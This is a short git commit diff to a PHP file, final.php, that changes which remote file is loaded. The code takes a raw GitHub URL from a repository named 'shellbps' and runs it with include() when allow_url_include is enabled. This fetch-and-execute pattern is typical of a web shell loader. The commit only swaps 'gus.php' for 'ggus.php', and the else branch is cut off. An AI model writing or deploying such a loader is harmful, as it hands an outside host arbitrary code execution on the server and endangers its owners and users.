6133c1aadd8b9242f63968fe12b4b62a226427f2
hagan1337 <100196234+hagan1337@users.noreply.github.com>
2026-02-15 18:50:08 +0700

    Update final.php

--- final.php
+++ final.php
@@ -1,5 +1,5 @@
 <?php
-$u='https://raw.githubusercontent.com/hagan1337/shellbps/refs/heads/main/gus.php';
+$u='https://raw.githubusercontent.com/hagan1337/shellbps/refs/heads/main/ggus.php';
 if(ini_get('allow_url_include')){
     include($u);
 }else{
